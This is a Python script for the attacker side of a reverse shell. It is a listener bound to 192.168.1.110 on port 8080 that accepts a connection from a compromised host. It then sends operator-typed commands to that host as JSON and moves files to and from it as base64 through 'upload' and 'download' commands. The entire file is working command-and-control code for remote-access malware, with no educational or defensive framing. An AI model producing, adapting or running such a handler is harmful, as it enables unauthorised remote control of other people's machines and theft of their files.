import socket
import json
import base64

class SocketListen:
    def __init__(self, ip, port):
        my_listener = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        my_listener.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        my_listener.bind((ip, port))
        my_listener.listen(0)
        (self.my_connection, self.my_address) = my_listener.accept()
        print("Connected to:", str(self.my_address))

    def json_send(self, data):
        json_data = json.dumps(data)
        self.my_connection.send(json_data.encode())

    def json_receive(self):
        json_data = ""
        while True:
            try:
                json_data += self.my_connection.recv(1024).decode()
                return json.loads(json_data)
            except ValueError:
                continue

    def command_exec(self, command_input):
        self.json_send(command_input)
        if command_input[0] == "quit":
            self.my_connection.close()
            exit()
        return self.json_receive()
    
    def save_file(self, path, content):
        with open(path, "wb") as myfile:
            myfile.write(base64.b64decode(content))
        return "Download OK"

    def get_file_contents(self, path):
        with open(path, "rb") as myfile:
            return base64.b64encode(myfile.read()).decode('utf-8')

    def start_listener(self):
        while True:
            command_input = input("Enter Command: ").split(" ")  # Split the input command by spaces
            try:
                if command_input[0] == "upload":
                    myfile_content = self.get_file_contents(command_input[1])
                    command_input.append(myfile_content)
                command_output = self.command_exec(command_input)
                if command_input[0] == "download" and "Error!" not in command_output    :
                    command_output = self.save_file(command_input[1], command_output)
            except Exception:
                command_output="Error!"
            print(command_output)

my_socket_listener = SocketListen("192.168.1.110", 8080)
my_socket_listener.start_listener()
